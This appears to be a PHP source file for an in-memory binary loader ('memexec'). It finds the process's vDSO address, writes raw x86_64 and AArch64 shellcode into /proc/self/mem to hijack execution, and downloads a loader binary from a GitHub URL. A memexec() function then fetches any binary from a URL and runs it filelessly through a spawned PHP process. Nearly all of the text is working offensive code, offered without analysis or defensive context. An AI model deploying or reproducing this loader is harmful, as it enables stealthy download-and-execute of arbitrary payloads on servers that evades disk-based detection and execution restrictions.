$SERVER = "https://github.com/arget13/memexec/raw/main/";
if(php_uname("m") == "x86_64")
{ // x64
    $binurl = $SERVER . "loader";
} else { // Aarch64
    $binurl = $SERVER . "loaderarm";
}

$executor='
preg_match("/^.*vdso.*\$/m", file_get_contents("/proc/self/maps"), $matches);
$vdso_addr = substr($matches[0], 0, strpos($matches[0], "-"));
$vdso_dec = hexdec($vdso_addr);
$vdso_addr = bin2hex(strrev(hex2bin($vdso_addr))); // To little endian
$syscall = file_get_contents("/proc/self/syscall");
$syscall_array = explode(" ", $syscall);
$addr_dec = hexdec(trim($syscall_array[8]));
if(php_uname("m") == "x86_64")
{ // x64
    $jmp = hex2bin("48b8". $vdso_addr . "0000ffe0");
    $shellcode = hex2bin("4d31c04d89c149f7d041ba320000004831c0b009bf00002000be00100000ba030000000f054831ffbe00002000ba001000004889f80f05bf00002000be00100000b80b0000000f054831c0b009bf00004000be00100000ba030000000f054831ffbe00004000ba380500004889f80f054829c24801c64885d275f04831c0b00abf00004000be00100000ba010000000f054831c0b009bf00104000be00e00800ba030000000f054831ffbe00104000ba21df08004889f80f054829c24801c64885d275f04831c0b00abf00104000be00e00800ba050000000f054831c0b009bf00f04800be00900200ba030000000f054831ffbe00f04800baf98602004889f80f054829c24801c64885d275f04831c0b00abf00f04800be00900200ba010000000f054831c0b009bf00804b00be00c00000ba030000000f054831ffbef88d4b00ba385200004889f80f054829c24801c64885d275f04831c0b00abf00804b00be00c00000ba030000000f054831c0b9f80b0000bf40e04b00f348ab4d31c04d89c149f7d041ba22000200ba03000000be001002004831ff4831c0b0090f054889c44881c4001002004881ec900000004831ff4889e6ba900000004889f80f0529c24801c685d275f2b8e0154000ffe0");
} else { // Aarch64
    $jmp = hex2bin("4000005800001fd6". $vdso_addr . "0000");
    $shellcode = hex2bin("430680d204008092a50005cac81b80d2010082d2620080d2a00b0058010000d4e10300aa000000ca020082d2e80780d2010000d4e00301aa010082d2e81a80d2010000d4c81b80d2620080d240070058a1070058010000d4e80780d2c106005862070058000000ca010000d42100008b420000eb81ffff54481c80d2a20080d2a005005801060058010000d4c81b80d22006005841060058620080d2010000d4e80780d20106005822060058000000ca010000d42100008b420000eb81ffff54481c80d280040058a1040058620080d2010000d400050058a18180d21f8400f8210400f1c1ffff54c81b80d2620080d26302005841040058000000ca010000d40000018b004002d11f000091021280d2e80780d2e1030091000000ca010000d42100008b420000eb81ffff54c002005800001fd6000040000000000022000200000000000090080000000000048408000000000000804900000000000080000000000000688f490000000000305000000000000098df4900000000000010020000000000d0054000000000000000200000000000");
}
$fd = fopen("/proc/self/mem", "r+");
fseek($fd, $vdso_dec);
fwrite($fd, $shellcode);
fseek($fd, $addr_dec);
fwrite($fd, $jmp);
fclose($fd);
file_get_contents("/proc/self/maps");
';

$cmd_array = ['php', '-a'];
$descriptorspec = array(
    0 => array("pipe", "r"),
    1 => fopen('php://stdout', 'w'),
    2 => fopen('php://stderr', 'w'),
    3 => fopen('php://stdin' , 'w')
);

$process = proc_open($cmd_array, $descriptorspec, $pipes);
fwrite($pipes[0], $executor);

sleep(1);
$f = fopen($binurl, "r");
$data = "";
while (!feof($f))
    fwrite($pipes[0], fread($f, 2048));
fclose($f);

$GLOBALS['pipe'] = $pipes[0];
function memexec($url, $argv = [], $stop = true)
{
    $args = "";
    foreach($argv as &$arg)
        $args .= $arg . "\0";
    unset($arg);

    $f = fopen($url, "r");
    $binary = "";
    while(!feof($f))
        $binary .= fread($f, 2048);
    fclose($f);

    $args = pack('V', strlen($args)) . $args . pack('V', strlen($binary));
    fwrite($GLOBALS['pipe'], $args);
    fwrite($GLOBALS['pipe'], $binary);
    if($stop) posix_kill(posix_getpid(), 19);
}
